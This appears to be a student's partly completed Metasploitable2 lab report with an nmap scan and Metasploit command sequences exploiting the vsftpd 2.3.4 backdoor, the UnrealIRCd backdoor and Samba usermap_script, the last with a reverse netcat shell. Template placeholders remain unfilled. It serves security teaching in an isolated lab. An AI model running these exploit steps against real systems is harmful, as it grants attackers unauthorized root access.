
# Metasploitable2 Exploitation Report

**Name:** Vera Baiden
**Index Number:** 7354523
**Date:** 2026-09-20
**Target IP:** 192.168.1.4
**Attacker OS / Tools:**  Kali Linux 2026.x, Metasploit Framework x.x, nmap x.x

---

## Reconnaissance Summary
Command: nmap -sV -sC -p- 192.168.1.4

Key findings (65505 closed, notable open ports):
21/tcp   ftp        vsftpd 2.3.4 (anonymous login allowed)
22/tcp   ssh        OpenSSH 4.7p1 Debian
23/tcp   telnet     Linux telnetd
25/tcp   smtp       Postfix smtpd
53/tcp   domain     ISC BIND 9.4.2
80/tcp   http       Apache httpd 2.2.8 (Ubuntu)
111/tcp  rpcbind
139/445  netbios-ssn Samba smbd 3.X-4.X / 3.0.20-Debian
512-514  exec/login/shell (rsh/rlogin, no auth)
1099/tcp java-rmi   GNU Classpath grmiregistry
1524/tcp bindshell  "Metasploitable root shell"
2049/tcp nfs
3306/tcp mysql      MySQL 5.0.51a-3ubuntu5
3632/tcp distccd    v1 4.2.4
5432/tcp postgresql PostgreSQL 8.3.0-8.3.7
5900/tcp vnc        VNC (protocol 3.3)
6667/tcp irc        UnrealIRCd
8009/tcp ajp13      Apache Jserv
8180/tcp http       Apache Tomcat/Coyote 1.1




## Exploit 1:  "vsftpd 2.3.4 Backdoor"

- **Service / Port:**  FTP / 21
- **Vulnerability:** intentional backdoor in vsftpd 2.3.4 (CVE-2011-2523) 
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** The vulnerability's trigger is a fixed and known byte sequence. Metasploit automates sending it and catching the resulting shell and saves us from manually crafting the FTP session and connecting to port 6200 ourselves
  
- **Steps:**
  1. msfconsole - lauches Metasploit
  2. search vsftpd - searches for the module    
  3. use exploit/uni/ftp/vsftpd_234_backdoor
  4. set RHOSTS 192.168.1.4 - sets the target
  5. show options - verifies options
  6. set LHOST 192.168.1.3 - necessary beacause this module version defaults to      a Meterpreter payload requiring a listener
  7. exploit - runs the exploit
  8. getuid - confirms root access
   
- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
- 
- **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified the exact        vsftpd version( vsftpd2.3.4)
- Weaponization - selects the matching Metasploitable module
- Delivery - module connects and sends the crafted username to the FTP service
- Exploitation - backdoor triggers, spawning the listener
- Installation, C2 - Mererpreter session is established and gives remote controll

- **Outcome / Impact:** Full root shell on the target with no credentials required

---

## Exploit 2: UnrealIRCd 3.2.8.1 Backdoor

- **Service / Port:** IRC/6667
- **Vulnerability:** Trojanized UnrealIRCd 3.2.8.1
- **Tool Used:**  Metasploit — exploit/unix/irc/unreal_irc_3281_backdoor
- **Why This Tool:** The backdoor's activation string is afixed, undocumented sequence buried in the compromised source. Metasploit's module has this hardcoded and handles registering a fake IRC connection to deliver it which would be tedious to replicate manuallywith raw sockets/netcat
- **Steps:**
  1. search unrealircd
  2. use exploit/unix/irc/unreal_irc_3281_backdoor
  3. set RHOSTS 192.168.1.4
  4. set LHOST 192.168.1.3
- **Evidence:** evidence/exploit1
- **Cyber Kill Chain Stage(s):**  Reconnaissance - nmap identidied UnrealIRCd service on 6667
- Weaponization - selected matching module
- Delivery - module registered an IRC connection and sent the trigger line
- Exploitation - backdoor executed the embedded command
- Installation, C2 - Meterpreter session is established

- **Outcome / Impact:** Remote shell access on the target via the IRC service

## Exploit 3: Samba usermap_script RCE (port 139/445)

- **Service / Port:** SMB/139(Samba)
- **Vulnerability:** Samba 3.0.20-3.0.25rc3 username map script command injection (CVE-2007-2447)
- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
- **Why This Tool:** The injection requires a username string with specific shell metacharacters and syntax that the target's username map script config will pass through unsanitized. Metasploit's module handles the exact malformed login sequence and payload delivery which is fiddly to get right by hand via raw SMB/Samba clientcalls
- **Steps:**
  1. background - kept the exploit 2 Meterpreter session alive
  2. search samba usermap
  3. use exploit/multi/samba/usermap_script which defaulted to cmd/unix/reverse_netcat payload
  4. set RHOSTS 192.168.1.4
  5. set LHOST 192.168.1.3
  6. exploit - opens command shell session 2
  7. whoami / id 
      
- **Evidence:** evidence/exploit3.png>
- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance -
-  Weaponization
-  Exploitation
-  Installation, C2
  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
- **Outcome / Impact:** <What access/data/privilege you actually got>

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. <title> | ✔ | ✔ | ✔ | ✔ | | | |
| 2. <title> | | | | | | | |
| ... | | | | | | | |
| 10. <title> | | | | | | | |

---

## Lessons Learned / Mitigations (optional but recommended)

<For at least 2–3 of your exploits, what would actually fix the vulnerability
(patch, config change, disabling a service, etc.)?>
